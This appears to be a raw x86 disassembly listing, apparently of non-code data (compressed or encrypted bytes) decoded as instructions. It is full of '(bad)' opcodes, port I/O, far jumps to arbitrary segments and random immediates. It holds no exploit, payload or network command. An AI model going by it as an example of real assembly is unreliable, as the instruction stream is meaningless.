  4203e1:	lods   al,BYTE PTR ds:[esi]
  4203e2:	mov    al,ds:0x94951bc6
  4203e7:	popa   
  4203e8:	ins    DWORD PTR es:[edi],dx
  4203e9:	pop    eax
  4203ea:	dec    esp
  4203eb:	mov    edx,0x491b667f
  4203f0:	xchg   DWORD PTR [ebp+0x46],ebx
  4203f3:	or     edi,DWORD PTR [esi]
  4203f5:	push   ss
  4203f6:	imul   ebp,DWORD PTR [ebx],0xfffffff6
  4203f9:	dec    ecx
  4203fa:	jns    0x42044f
  4203fc:	hlt    
  4203fd:	xchg   edi,eax
  4203fe:	sub    dl,BYTE PTR [edi-0x5e]
  420401:	inc    ebx
  420402:	mov    al,ds:0x261fe30e
  420407:	je     0x420436
  420409:	mov    ebp,DWORD PTR [edx+0x35]
  42040c:	imul   ebp,DWORD PTR [esi+0x379212dd],0x60
  420413:	push   ebx
  420414:	xchg   edi,eax
  420415:	(bad)  
  420416:	sub    BYTE PTR [edx],cl
  420418:	fs mov eax,edi
  42041b:	not    BYTE PTR [edi-0x66552a11]
  420421:	retf   0xae53
  420424:	dec    ebx
  420425:	sbb    eax,0xd2f3e45c
  42042a:	or     al,0xff
  42042c:	test   al,0xa5
  42042e:	in     eax,0x6
  420430:	adc    eax,ebx
  420432:	dec    edx
  420433:	sbb    BYTE PTR [edx-0x55],dh
  420436:	aad    0x5c
  420438:	ror    DWORD PTR [eax-0x4f66ac5a],cl
  42043e:	fist   WORD PTR [edx]
  420440:	xor    DWORD PTR [eax-0xf],ebx
  420443:	mov    al,ds:0xbd2d4308
  420448:	test   DWORD PTR [ecx-0x5d84e141],0x34dc5c16
  420452:	push   cs
  420453:	mov    dh,0x97
  420455:	xchg   ecx,ebx
  420457:	sbb    bh,al
  420459:	data16 cld 
  42045b:	inc    ebx
  42045c:	inc    ecx
  42045d:	lock cld 
  42045f:	pop    edi
  420460:	bound  esp,QWORD PTR [esi+0x2b85a8f9]
  420466:	xchg   BYTE PTR [edx-0x12c97a18],cl
  42046c:	mov    eax,ds:0xc2def4de
  420471:	sar    DWORD PTR [ebx-0x14d1ff4c],cl
  420477:	repz dec ebp
  420479:	int    0x94
  42047b:	lods   al,BYTE PTR ds:[esi]
  42047c:	mov    al,0x2e
  42047e:	xor    al,0x46
  420481:	pop    esp
  420482:	sub    eax,ecx
  420484:	scas   al,BYTE PTR es:[edi]
  420485:	fstp   QWORD PTR [edx]
  420487:	jns    0x4204eb
  420489:	(bad)  
  42048a:	imul   ebx,DWORD PTR [edx+0x2f],0xffffffd3
  42048e:	in     eax,dx
  42048f:	data16 icebp 
  420491:	mov    WORD PTR [esi+0x1b],?
  420494:	inc    esi
  420495:	xchg   esi,eax
  420496:	jae    0x420497
  420498:	test   DWORD PTR [edx-0x25609b8f],edi
  42049e:	int3   
  42049f:	cmp    al,0x54
  4204a1:	scas   eax,DWORD PTR es:[edi]
  4204a2:	sub    ebx,DWORD PTR [edi+ebx*8-0xe]
  4204a6:	pop    eax
  4204a7:	shl    BYTE PTR [ecx+0x1a75a82b],0x5b
  4204ae:	jne    0x42049a
  4204b0:	adc    al,0x5c
  4204b2:	sbb    dl,cl
  4204b4:	mov    ds:0x82d1271b,al
  4204b9:	int3   
  4204ba:	pusha  
  4204bb:	les    ebx,FWORD PTR [esi-0x2cfbe995]
	...
  420531:	add    BYTE PTR [eax],al
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	add    al,0xc
  420542:	xor    ebp,edx
  420544:	dec    esi
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	cmc    
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [ebx],dl
  42054d:	pop    ds
  42054e:	int    0xb
  420550:	xchg   ecx,eax
  420551:	xchg   edi,eax
  420552:	add    BYTE PTR [esi],ch
  420554:	sar    BYTE PTR [ecx-0x79a3f1ea],cl
  42055a:	lds    edx,FWORD PTR [eax]
  42055c:	stos   DWORD PTR es:[edi],eax
  42055d:	pop    eax
  42055e:	jne    0x420539
  420560:	jle    0x4204f1
  420562:	cmp    esp,ecx
  420564:	mov    al,0xf3
  420566:	cld    
  420567:	mov    esi,ebp
  420569:	lock push esi
  42056b:	adc    DWORD PTR [ecx+edx*8+0x19],0xca837932
  420573:	cmp    DWORD PTR [esi-0x19],0xffffffad
  420577:	pop    esi
  420578:	pop    ds
  420579:	push   0x8c349c98
  42057e:	cs adc bh,0x68
  420582:	inc    esi
  420583:	fcomp  QWORD PTR gs:[esi+edx*8+0x1e685912]
  42058b:	fnsave [edi-0x4a]
  42058e:	adc    eax,0xc93d0785
  420593:	test   eax,0x2b6fba05
  420598:	xor    bl,BYTE PTR [edx]
  42059a:	mov    eax,0x560734d9
  42059f:	sub    BYTE PTR [edi-0x6a943c4c],0xd1
  4205a6:	out    0xa0,eax
  4205a8:	or     al,0x27
  4205aa:	imul   ebx,DWORD PTR [edi-0x4fbb4b4c],0xa51960f4
  4205b4:	hlt    
  4205b5:	mov    dh,0xe1
  4205b7:	pop    eax
  4205b8:	cld    
  4205b9:	pop    edi
  4205ba:	data16 or BYTE PTR [edi],dl
  4205bd:	lods   al,BYTE PTR ds:[esi]
  4205be:	into   
  4205bf:	pop    ds
  4205c0:	aam    0x84
  4205c2:	dec    ebp
  4205c3:	jbe    0x4205a8
  4205c5:	and    eax,DWORD PTR [ebx+eiz*4+0x48]
  4205c9:	loope  0x420606
  4205cb:	sub    DWORD PTR [eax],eax
  4205cd:	xor    BYTE PTR [eax],0x25
  4205d0:	add    esp,esi
  4205d2:	sub    esp,0x1d
  4205d5:	mov    bh,0xe3
  4205d7:	adc    eax,0xd98c2e1d
  4205dc:	lods   al,BYTE PTR ds:[esi]
  4205dd:	(bad)  
  4205de:	in     al,dx
  4205df:	cs add dl,0xd0
  4205e3:	push   edx
  4205e4:	xor    BYTE PTR [edi-0x45],bl
  4205e7:	loop   0x420633
  4205e9:	mov    ds:0x9b451866,al
  4205ee:	ja     0x4205cd
  4205f0:	int    0x8e
  4205f2:	xor    al,0xc2
  4205f4:	add    ebx,DWORD PTR [esi-0x7c]
  4205f7:	aas    
  4205f8:	in     eax,0xc8
  4205fa:	xchg   ebx,eax
  4205fb:	dec    ebp
  4205fc:	stos   DWORD PTR es:[edi],eax
  4205fd:	and    ch,BYTE PTR [esi+edi*4]
  420600:	sub    al,0x35
  420602:	loope  0x42062f
  420604:	jns    0x42062d
  420606:	push   ebp
  420607:	mov    ch,0x49
  420609:	sub    BYTE PTR [ebx-0x32],0x65
  42060d:	xchg   ecx,eax
  42060e:	arpl   di,ax
  420610:	mov    edx,0xb88e063f
  420615:	pop    ebp
  420616:	imul   ebp,esp,0xffffffcc
  420619:	sub    eax,0x2bc64459
  42061e:	das    
  42061f:	cli    
  420620:	fistp  QWORD PTR [esi+0x71]
  420623:	inc    eax
  420624:	fcomp  st(5)
  420626:	je     0x42065f
  420628:	es cli 
  42062a:	adc    DWORD PTR [esi-0x257a8a15],esi
  420630:	cli    
  420631:	push   ecx
  420632:	or     al,0xc4
  420634:	sub    BYTE PTR [eax+ebx*8],bh
  420637:	(bad)  
  420639:	cmp    cl,BYTE PTR [ebp-0x28]
  42063c:	(bad)  
  42063d:	call   0x82770a
	...
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	call   0x15b:0x4313631f
  4206c7:	add    ch,dh
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [edi],bl
  4206cd:	clc    
  4206ce:	sub    bh,dh
  4206d0:	ins    DWORD PTR es:[edi],dx
  4206d1:	lods   eax,DWORD PTR ds:[esi]
  4206d2:	pop    esp
  4206d3:	(bad)  
  4206d5:	push   0x56
  4206d7:	retf   
  4206d8:	jmp    0x2c77:0x4a88fd11
  4206df:	and    eax,0x6135e42f
  4206e4:	mov    dh,0x4e
  4206e6:	add    ah,BYTE PTR [edi-0x20]
  4206e9:	cmc    
  4206ea:	shr    BYTE PTR [edx-0x4d],cl
  4206ed:	test   bh,al
  4206ef:	jnp    0x42073e
  4206f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f2:	into   
  4206f3:	mov    al,ds:0xd384e10a
  4206f8:	imul   ebp,DWORD PTR [edi],0x28126313
  4206fe:	mov    ebp,0xac25c456
  420703:	out    dx,al
  420704:	enter  0x98cb,0xa9
  420708:	mov    ch,0x1f
  42070a:	test   al,0x8
  42070c:	in     al,0xe8
  42070e:	mov    ecx,0x1c4a2e06
  420713:	jae    0x420735
  420715:	sbb    al,0x42
  420717:	push   cs
  420718:	pusha  
  420719:	in     al,dx
  42071a:	out    dx,eax
  42071b:	mov    ebp,0xaf99bbf7
  420720:	mov    BYTE PTR [ecx-0x2f],ah
  420723:	les    eax,FWORD PTR [edx-0x3c]
  420726:	mov    ds:0xef6298c7,eax
  42072b:	ret    0xc6e6
  42072e:	stos   DWORD PTR es:[edi],eax
  42072f:	(bad)  
  420730:	cli    
  420731:	rcr    DWORD PTR [eax+0x773dd6b7],cl
  420737:	push   0xc58d62a8
  42073c:	dec    ecx
  42073d:	sub    eax,0x8982d88e
  420742:	adc    DWORD PTR ds:[edi+0xb1c1717],esp
  420749:	pop    eax
  42074a:	jnp    0x4206ce
  42074c:	push   0x3f
  42074e:	lods   al,BYTE PTR ds:[esi]
  42074f:	gs cld 
  420751:	shl    BYTE PTR ds:0x5d1eab4d,cl
  420757:	add    DWORD PTR [edx],ebp
  420759:	pop    esi
  42075a:	dec    ebx
  42075b:	sub    eax,0x8af2cb9f
  420760:	mov    ebp,0x7fc94acf
  420765:	mov    BYTE PTR [ebp+edx*1-0x15],cl
  420769:	or     edi,DWORD PTR [eax-0x7d]
  42076c:	(bad)  
  42076d:	retf   0xe62b
  420770:	repnz nop
  420772:	out    0x37,al
  420774:	and    eax,0x46003595
  420779:	cld    
  42077a:	(bad)  
  42077b:	jl     0x4207ce
  42077d:	push   cs
  42077e:	or     BYTE PTR [edi+0x25],bl
  420781:	pop    es
  420782:	add    BYTE PTR [esi+0x2f],ch
  420785:	(bad)  [eax+0x79b32082]
  42078b:	adc    eax,0xdff9ebf2
  420790:	lods   eax,DWORD PTR ds:[esi]
  420791:	into   
  420792:	sbb    DWORD PTR [edx-0xf],ebp
  420795:	sub    al,0x8f
  420797:	addr16 push ss
  420799:	push   ss
  42079a:	sbb    eax,0x7a3cbb0d
  42079f:	(bad)  
  4207a0:	(bad)  [ebp-0x3c]
  4207a3:	aas    
  4207a4:	lahf   
  4207a5:	adc    eax,ecx
  4207a7:	push   ebx
  4207a8:	dec    ecx
  4207a9:	dec    eax
  4207aa:	test   DWORD PTR [edi-0x20],esp
  4207ad:	bound  esi,QWORD PTR [eax]
  4207af:	or     dh,al
  4207b1:	add    eax,0x71488dda
  4207b6:	popf   
  4207b7:	or     BYTE PTR [ebp+eiz*1+0x2bfa4a52],cl
  4207be:	dec    edi
  4207bf:	out    0xab,al
	...
  420831:	add    BYTE PTR [eax],al
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0xa2
  420841:	dec    edx
  420842:	mov    ebx,0x15c38a0
  420847:	add    ch,dh
  420849:	add    BYTE PTR [eax],al
  42084b:	add    BYTE PTR [ebp+0xe937bd1],bh
  420851:	pop    edx
  420852:	mov    ebx,0x59628ab1
  420857:	arpl   WORD PTR [edi+0x56],si
  42085a:	ret    0xbb5f
  42085d:	sbb    eax,0x1615bff2
  420862:	aam    0x3a
  420864:	call   0x58ea7e15
  420869:	popf   
  42086a:	and    BYTE PTR [eax-0x761779e4],ah
  420870:	pop    esp
  420871:	mov    bh,0x45
  420873:	xchg   ebp,eax
  420874:	dec    edx
  420875:	dec    eax
  420876:	inc    ecx
  420877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420878:	(bad)  
  420879:	retf   0x2de
  42087c:	or     DWORD PTR [ebx+0x4],ebp
  42087f:	cmc    
  420880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420881:	xor    ebx,DWORD PTR [ecx+0x68]
  420884:	fldcw  WORD PTR [edx+0x52]
  420887:	jg     0x42080b
  420889:	mov    ds:0xe8277703,al
  42088e:	or     BYTE PTR [edx],0x24
  420891:	sti    
  420892:	xchg   ebp,eax
  420893:	push   esi
  420894:	call   0x8c47:0x1c954460
  42089b:	into   
  42089c:	pop    edx
  42089d:	ins    DWORD PTR es:[edi],dx
  42089e:	fst    st(1)
  4208a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a1:	jl     0x42084b
  4208a3:	cmc    
  4208a4:	scas   eax,DWORD PTR es:[edi]
  4208a5:	repnz ror BYTE PTR [ecx+0x3f],1
  4208a9:	add    eax,DWORD PTR [esi+ebp*1-0x80]
  4208ad:	out    dx,eax
  4208ae:	add    bh,ch
  4208b0:	ret    
  4208b1:	fwait
  4208b2:	pop    ds
  4208b3:	daa    
  4208b4:	aaa    
  4208b5:	xchg   edx,eax
  4208b6:	mov    WORD PTR [edx+0x10dbb5c4],ss
  4208bc:	pop    esp
  4208bd:	or     DWORD PTR [ebp-0x563cf078],edi
  4208c3:	ret    0x4b53
  4208c6:	div    BYTE PTR [esi]
  4208c8:	imul   edi,ebp,0x2a
  4208cb:	sbb    eax,0x74114980
  4208d0:	aaa    
  4208d1:	pop    esi
  4208d2:	repz dec ebx
  4208d4:	xor    DWORD PTR [eax-0x1],edi
  4208d7:	xor    DWORD PTR [edi-0x5],edi
  4208da:	and    DWORD PTR [ecx+0x7a0824a9],ebx
  4208e0:	xchg   ebx,eax
  4208e1:	cmp    BYTE PTR [ebp+0x6a69c507],0x8c
  4208e8:	jmp    0x4208c9
  4208ea:	aam    0xc9
  4208ec:	push   0xebe6dae1
  4208f1:	push   eax
  4208f2:	cmp    esp,DWORD PTR [edx]
  4208f4:	or     al,BYTE PTR [edi-0x9]
  4208f7:	xchg   BYTE PTR [ecx],al
  4208f9:	sub    BYTE PTR [esi+0x0],ah
  4208fc:	mov    cl,bh
  4208fe:	cwde   
  4208ff:	shl    BYTE PTR [ebp-0x27],cl
  420902:	stos   BYTE PTR es:[edi],al
  420903:	mov    ds:0xed077dc5,eax
  420908:	mov    al,0x35
  42090a:	mov    ds:0xfb79779c,al
  42090f:	add    ebx,DWORD PTR [ecx+edi*4+0x775c1943]
  420916:	adc    eax,0xce32f683
  42091b:	retf   0xad46
  42091e:	aas    
  42091f:	pop    eax
  420920:	jb     0x420910
  420922:	dec    ebx
  420923:	push   ecx
  420924:	pusha  
  420925:	adc    esi,DWORD PTR [edx-0x6eface13]
  42092b:	xchg   edi,eax
  42092c:	xchg   ebp,eax
  42092d:	outs   dx,BYTE PTR ds:[esi]
  42092e:	and    eax,0xcd369796
  420933:	push   edi
  420934:	and    DWORD PTR ds:0x2508ef98,edx
  42093a:	sub    DWORD PTR [ebx-0x10],edx
  42093d:	mov    bl,0x92
  42093f:	enter  0x7f,0x0
	...
  4209b3:	add    BYTE PTR [edx],cl
  4209b5:	inc    ecx
  4209b6:	mov    bh,0xa1
  4209b8:	push   edi
  4209ba:	push   ds
  4209bb:	jmp    0x42097d
  4209bd:	sahf   
  4209be:	fisub  WORD PTR [esi+0x21]
  4209c1:	loop   0x42094d
  4209c3:	adc    ebp,DWORD PTR ds:0xf500015d
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR [ebp+0x238416a6],ch
  4209d1:	sbb    BYTE PTR [esi],dl
  4209d3:	cmp    al,0x9
  4209d5:	xor    bh,BYTE PTR [ebp+0x32]
  4209d8:	jecxz  0x420a51
  4209da:	inc    esp
  4209db:	inc    ebx
  4209dc:	add    BYTE PTR [esi],ah
  4209de:	imul   DWORD PTR [edx-0x5]
  4209e1:	retf   0xeaa
  4209e4:	mov    al,ds:0xa23ba1ad
  4209e9:	push   cs
  4209ea:	sbb    al,0xba
  4209ec:	lahf   
  4209ed:	call   0xb8093dd2
  4209f2:	or     al,0x4
  4209f4:	jnp    0x42099b
  4209f6:	aas    
  4209f7:	jnp    0x4209ec
  4209f9:	sbb    cl,BYTE PTR [esp+ebx*4+0x1c2bc7bc]
  420a00:	rol    BYTE PTR ds:[eax],cl
  420a03:	dec    edx
  420a04:	mov    ah,0x40
  420a06:	adc    al,dh
  420a08:	ins    BYTE PTR es:[edi],dx
  420a09:	iret   
  420a0a:	ret    0xc195
  420a0d:	bound  esp,QWORD PTR ds:0x2bf25e65
  420a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a14:	sar    DWORD PTR [ebx+0x6f42a98f],0x8c
  420a1b:	add    BYTE PTR [edi-0x62],dl
  420a1e:	push   esp
  420a1f:	rcl    BYTE PTR [esi-0x52],cl
  420a22:	pop    ecx
  420a23:	icebp  
  420a24:	or     ebx,ecx
  420a26:	jle    0x420a21
  420a28:	sbb    eax,0xf58cb587
  420a2d:	fwait
  420a2e:	in     eax,dx
  420a2f:	dec    ebx
  420a30:	xor    al,0x90
  420a32:	push   ss
  420a33:	ja     0x420a25
  420a35:	(bad)  [esi+0x2c]
  420a38:	jae    0x420a29
  420a3a:	imul   esp,DWORD PTR [edx],0xcc186257
  420a40:	(bad)  
  420a41:	daa    
  420a42:	rol    BYTE PTR [esi],cl
  420a44:	xchg   esi,eax
  420a45:	sub    DWORD PTR [edi-0x56e5b69],esp
  420a4b:	mov    ebx,0xf5e67acb
  420a50:	adc    al,0xf8
  420a52:	and    ah,BYTE PTR [edx]
  420a54:	jne    0x420aba
  420a56:	xchg   edi,eax
  420a57:	push   es
  420a58:	push   0x833388e3
  420a5d:	repnz inc edx
  420a5f:	jg     0x420acc
  420a61:	adc    BYTE PTR [esi-0x39],ch
  420a64:	jnp    0x420a49
  420a66:	mov    BYTE PTR [ebp-0x53],0x87
  420a6a:	fisttp QWORD PTR [ecx+0x6cc2e921]
  420a70:	adc    bh,BYTE PTR [ebx-0x47]
  420a73:	sub    edi,DWORD PTR [ecx]
  420a75:	mov    ebx,DWORD PTR [ebx]
  420a77:	xor    BYTE PTR [ebx+0x1a72c010],ch
  420a7d:	inc    ebp
  420a7e:	cld    
  420a7f:	dec    ebx
  420a80:	aas    
  420a81:	fild   WORD PTR [eax]
  420a83:	cld    
  420a84:	cli    
  420a85:	push   esi
  420a86:	xchg   DWORD PTR [ebp+eiz*2-0x7db193ba],esp
  420a8d:	jb     0x420a24
  420a8f:	and    edx,0x915bfc2f
  420a95:	scas   al,BYTE PTR es:[edi]
  420a96:	(bad)  
  420a97:	pop    DWORD PTR [edi]
  420a99:	cli    
  420a9a:	shl    DWORD PTR [esi+0x3a],0x8e
  420a9e:	sub    bl,ah
  420aa0:	sub    al,BYTE PTR [edx]
  420aa2:	ror    DWORD PTR [edi-0x36],1
  420aa5:	push   ebx
  420aa6:	imul   ebx,DWORD PTR [ebx+ecx*1-0xb],0x4a574b79
  420aae:	jg     0x420aeb
  420ab0:	rcr    BYTE PTR [ecx+0x68],1
  420ab3:	call   FWORD PTR [edx+eiz*8-0x2]
  420ab7:	xor    BYTE PTR [eax],0x24
  420aba:	jne    0x420b0d
  420abc:	je     0x420ae0
  420abe:	xor    DWORD PTR [esi+0x56],esp
	...
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	adc    bl,BYTE PTR [esi]
  420b43:	in     eax,dx
  420b44:	and    bl,BYTE PTR [esi+0x1]
  420b47:	add    ch,dh
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [ebx],ch
  420b4d:	mov    ecx,0x59cad523
  420b52:	outs   dx,BYTE PTR ds:[esi]
  420b53:	addr16 inc ebp
  420b55:	sbb    eax,ebx
  420b57:	jns    0x420bb2
  420b59:	jl     0x420ba8
  420b5b:	into   
  420b5c:	aad    0xce
  420b5e:	xchg   ebp,eax
  420b5f:	(bad)  
  420b61:	aas    
  420b62:	push   ds
  420b63:	add    BYTE PTR [edi+0x1c],cl
  420b66:	mov    ch,0x34
  420b68:	pusha  
  420b69:	rol    DWORD PTR ds:0x45f19703,1
  420b6f:	fst    DWORD PTR [ebp-0x4]
  420b72:	push   cs
  420b73:	cdq    
  420b74:	mov    bh,0x9e
  420b76:	jo     0x420b92
  420b78:	out    dx,al
  420b79:	mov    edx,DWORD PTR [edi+0x72b9d3a9]
  420b7f:	int3   
  420b80:	xchg   BYTE PTR [ecx+0x52e52dca],cl
  420b86:	xor    BYTE PTR [ebp-0x19fd6e0e],0x24
  420b8d:	cmp    DWORD PTR [ecx+0x28],esp
  420b90:	js     0x420beb
  420b92:	jo     0x420b74
  420b94:	sahf   
  420b95:	inc    ebx
  420b96:	repnz mov edx,DWORD PTR [ebx+0x1b]
  420b9a:	mov    ch,0x95
  420b9c:	ja     0x420c09
  420b9e:	adc    al,BYTE PTR [edx-0x6e04b9e1]
  420ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba5:	imul   esi,DWORD PTR [eax+0x68],0x50
  420ba9:	std    
  420baa:	mov    edi,0x91adbeec
  420baf:	(bad)  
  420bb1:	cmc    
  420bb2:	ficomp DWORD PTR [esi]
  420bb4:	rol    DWORD PTR [ecx-0x4612e11e],0x1b
  420bbb:	repz dec edi
  420bbd:	sahf   
  420bbe:	adc    eax,DWORD PTR [ebp-0x73dd89db]
  420bc4:	xchg   esi,eax
  420bc5:	and    eax,0xab5c4e44
  420bca:	or     DWORD PTR [ebp-0x20],esp
  420bcd:	add    ecx,DWORD PTR [ecx+eax*1]
  420bd0:	xchg   DWORD PTR [esp+eax*4],ecx
  420bd3:	ret    0x4802
  420bd6:	xchg   ebx,eax
  420bd7:	cmp    BYTE PTR [edx-0x262147c],cl
  420bdd:	push   esi
  420bde:	fistp  WORD PTR [eax+0x52928212]
  420be4:	jmp    0x84fe:0x44e30aa
  420beb:	lods   eax,DWORD PTR ds:[esi]
  420bec:	jne    0x420c1e
  420bee:	adc    ah,BYTE PTR [eax+0x38]
  420bf1:	mov    ebp,0xe0315d4f
  420bf6:	mov    cl,0xcd
  420bf8:	or     edi,DWORD PTR [ecx-0x77]
  420bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bfc:	iret   
  420bfd:	xchg   edi,eax
  420bfe:	pop    ecx
  420bff:	enter  0xbff5,0x3d
  420c03:	sbb    al,0x33
  420c05:	push   ebp
  420c06:	sti    
  420c07:	jb     0x420c49
  420c09:	out    0x6c,eax
  420c0b:	add    al,0xc9
  420c0d:	loopne 0x420c3c
  420c0f:	pop    ebp
  420c10:	out    0x3b,eax
  420c12:	inc    edx
  420c13:	aad    0x1a
  420c15:	call   0x1591:0xaaf8fbde
  420c1c:	pusha  
  420c1d:	pop    edx
  420c1e:	xor    DWORD PTR [esi+0x41ab4d19],0xffffffca
  420c25:	inc    esp
  420c26:	hlt    
  420c27:	iret   
  420c28:	xchg   edx,eax
  420c29:	rcl    dh,0x56
  420c2c:	lea    ebp,[edx+0x25]
  420c2f:	test   BYTE PTR [ebx],ah
  420c31:	inc    edi
  420c32:	and    al,0x33
  420c34:	pop    ebp
  420c35:	cmp    DWORD PTR [ebx-0x587993c7],esi
  420c3b:	jnp    0x420c6c
  420c3d:	ret    0xa636
  420c40:	dec    ecx
	...
  420cb1:	add    BYTE PTR [eax],al
  420cb3:	add    BYTE PTR [edx+ebp*2],cl
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x7cc1e85f
  420cc3:	(bad)  
  420cc4:	pop    ss
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    BYTE PTR ds:0x9a4edc35,bh
  420cd1:	adc    cl,bl
  420cd3:	and    al,0x2
  420cd5:	mov    edi,edx
  420cd7:	cli    
  420cd8:	lahf   
  420cd9:	inc    ecx
  420cda:	lds    ebp,FWORD PTR [ebx-0x34]
  420cdd:	inc    esi
  420cde:	js     0x420d4d
  420ce0:	aam    0xe
  420ce2:	cld    
  420ce3:	lahf   
  420ce4:	mov    bl,0x27
  420ce6:	lea    ecx,ds:[eax-0x59]
  420cea:	cmp    DWORD PTR [eax],ebx
  420cec:	pop    ss
  420ced:	(bad)  [edx-0xa2022ea]
  420cf3:	sar    BYTE PTR [ebp+0x30],1
  420cf6:	jae    0x420d6d
  420cf8:	add    ah,BYTE PTR [ebp+0x39bed6a3]
  420cfe:	cwde   
  420cff:	mov    esp,ecx
  420d01:	mov    eax,ds:0x746a6068
  420d06:	dec    ecx
  420d07:	pop    es
  420d08:	ins    DWORD PTR es:[edi],dx
  420d09:	(bad)  
  420d0a:	fistp  DWORD PTR [eax+0xcedf898]
  420d10:	and    bh,BYTE PTR [ecx-0x46]
  420d13:	(bad)  
  420d15:	cs scas eax,DWORD PTR es:[edi]
  420d17:	dec    esp
  420d18:	dec    eax
  420d19:	cmp    dh,bh
  420d1b:	ins    BYTE PTR es:[edi],dx
  420d1c:	in     eax,0xae
  420d1e:	inc    eax
  420d1f:	cld    
  420d20:	pushf  
  420d21:	outs   dx,DWORD PTR ds:[esi]
  420d22:	sti    
  420d23:	xchg   edx,eax
  420d24:	cmp    al,0xed
  420d26:	add    DWORD PTR [edi-0x4b],ebp
  420d29:	inc    esp
  420d2a:	push   esp
  420d2b:	jmp    0xecaa69a4
  420d30:	and    DWORD PTR [esi+eiz*8],0xffffffa0
  420d34:	cs xchg esp,eax
  420d36:	mov    ah,0x9e
  420d38:	clc    
  420d39:	and    DWORD PTR [edi+edi*8],edi
  420d3c:	lock imul esp,DWORD PTR [ecx],0xfffffffb
  420d40:	hlt    
  420d41:	fnstcw WORD PTR [edx]
  420d43:	mov    al,ds:0x6baa7c26
  420d48:	or     cl,BYTE PTR [edx+ebp*8+0x17]
  420d4c:	cmp    ecx,DWORD PTR [ebx+0x25a87176]
  420d52:	outs   dx,DWORD PTR ds:[esi]
  420d53:	jecxz  0x420d52
  420d55:	jg     0x420d46
  420d57:	enter  0x570c,0x2f
  420d5b:	xor    esp,0x1d
  420d5e:	xchg   edx,eax
  420d5f:	jp     0x420d25
  420d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d62:	and    DWORD PTR [edi+0x673c9570],0xa1a41373
  420d6c:	pop    ebp
  420d6d:	add    eax,0x7550d124
  420d72:	xor    DWORD PTR [edi],ecx
  420d74:	shl    DWORD PTR [ebx+ebx*8-0x73],0xb5
  420d79:	call   0xa2aa:0x7257a40e
  420d80:	frstor [ebx-0x310abb1f]
  420d86:	int3   
  420d87:	cmp    al,0xe2
  420d89:	sti    
  420d8a:	mov    dh,0x20
  420d8c:	bound  esi,QWORD PTR [esi-0x48ca6c07]
  420d92:	jp     0x420d85
  420d94:	daa    
  420d95:	sbb    eax,0x80ef7852
  420d9a:	div    al
  420d9c:	dec    edi
  420d9d:	mov    cl,0x4e
  420d9f:	dec    ebx
  420da0:	sub    ecx,ecx
  420da2:	aaa    
  420da3:	adc    eax,0xd6b2b7d5
  420da8:	in     eax,0x33
  420daa:	idiv   cl
  420dac:	sbb    al,0xf1
  420dae:	push   edi
  420daf:	mov    ebx,DWORD PTR [edx+edx*4-0xe20185a]
  420db6:	dec    ecx
  420db7:	int3   
  420db8:	pop    ds
  420db9:	mov    edx,0x52f308c7
  420dbe:	fcmovu st,st(1)
  420dc0:	jmp    0x0:0x0
	...
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	repnz fisttp DWORD PTR [ebp-0x5c]
  420e44:	or     al,0x60
  420e46:	add    DWORD PTR [eax],eax
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    dh,ah
  420e4d:	(bad)  
  420e4e:	mov    ebp,0xae3bea55
  420e53:	xchg   DWORD PTR [eax],edx
  420e55:	pusha  
  420e56:	inc    esi
  420e57:	or     al,cl
  420e59:	inc    edi
  420e5a:	mov    bl,0x2e
  420e5c:	sub    edi,DWORD PTR [ecx+0x5e]
  420e5f:	sahf   
  420e60:	mov    eax,ds:0xd0525c07
  420e65:	and    al,0x49
  420e67:	sbb    al,0x76
  420e69:	mov    bl,0x73
  420e6b:	adc    esi,DWORD PTR [edi-0x574a719c]
  420e71:	cmp    BYTE PTR [ecx],bl
  420e73:	repnz pop eax
  420e75:	inc    edx
  420e76:	imul   edi,DWORD PTR [eax+ebx*1+0x227e8eaa],0xffffffc5
  420e7e:	mov    ds:0x4fe3b2f5,eax
  420e83:	push   ss
  420e84:	xchg   ecx,eax
  420e85:	daa    
  420e86:	mov    cl,0xb2
  420e88:	xor    eax,0xb8882b73
  420e8d:	enter  0x2cfb,0xd7
  420e91:	sub    DWORD PTR [esi-0xbc1988],0x921f73ba
  420e9b:	gs pop ebx
  420e9d:	sub    al,0x80
  420e9f:	jmp    0xb17a19f4
  420ea4:	lea    ecx,[eax+0x7]
  420ea7:	jo     0x420e2f
  420ea9:	mov    edi,0xc7846abc
